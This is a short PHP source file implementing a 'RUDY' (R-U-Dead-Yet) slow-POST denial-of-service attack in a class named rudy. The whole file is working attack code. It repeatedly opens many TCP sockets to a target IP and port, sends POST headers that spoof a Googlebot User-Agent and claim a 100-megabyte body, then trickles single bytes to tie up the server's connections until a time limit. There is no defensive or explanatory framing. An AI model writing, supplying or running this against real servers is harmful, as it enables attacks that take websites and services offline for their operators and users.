<?php
class rudy{



	function rudy($ip, $port, $starttime, $socketn, $max_time, $exec_time){
		$sourceips['google'] = '74.125.127.103';
		while(1){ 
			try{
				if(time() > $max_time){
					output($packets, $starttime, $exec_time, $lenght);
					break; 
				}
				for($i=0;$i<=$socketn;$i++){
					$sock[$i] = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
					socket_connect($sock[$i], $ip, $port);
					$out="POST / HTTP/1.1\r\n";
					$out.="Host: ".$ip."\r\n";
					$out.= "Connection: keep-alive\r\n";
					$out.="User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
					$out.="Content-length: 100000000\r\n";
					$out.= "\r\n";
					$packets++; 
					socket_write($sock[$i], $out);
				}
				for($j=0;$j<=$packets;$j++){
					socket_write($sock[$j], "A");
				}
			}catch (Exception $e){
					echo $e;
			}
		}
	}
}
?>